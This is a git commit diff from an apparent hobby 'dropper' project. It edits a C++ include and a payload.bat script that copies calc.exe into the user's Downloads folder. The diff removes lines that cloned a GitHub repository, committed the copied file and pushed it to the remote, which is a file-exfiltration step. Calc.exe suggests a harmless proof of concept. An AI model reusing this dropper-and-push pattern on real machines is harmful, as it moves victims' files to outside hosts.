f44a264d63ee2f4e56760328e6682ffa2d523ce4
Adi <adindeshpande@gmail.com>
2026-07-23 10:43:30 -0500

    updated the payload and added libgit2

--- Linux_mint_22.3/FileSystem_exe_rebuild/git_runner.cpp
+++ Linux_mint_22.3/FileSystem_exe_rebuild/git_runner.cpp
@@ -1,4 +1,4 @@
-#include <git2.h>
+#include "git2.h"
 #include <iostream>
 #include <cstring>
 
--- Linux_mint_22.3/FileSystem_exe_rebuild/payload.bat
+++ Linux_mint_22.3/FileSystem_exe_rebuild/payload.bat
@@ -4,12 +4,3 @@ copy "C:\Windows\System32\calc.exe" "%USERPROFILE%\Downloads"
 
 cd %USERPROFILE%\Downloads
 
-git clone https://github.com/Rastraktocat/Walmart-version-of-Dropper.git
-
-cd "%USERPROFILE%\Downloads\Walmart-version-of-Dropper\Linux_mint_22.3\FileSystem_exe_rebuild"
-
-git add "calc.exe"
-
-git commit -m "added calc.exe from cuckoo"
-
-git push origin
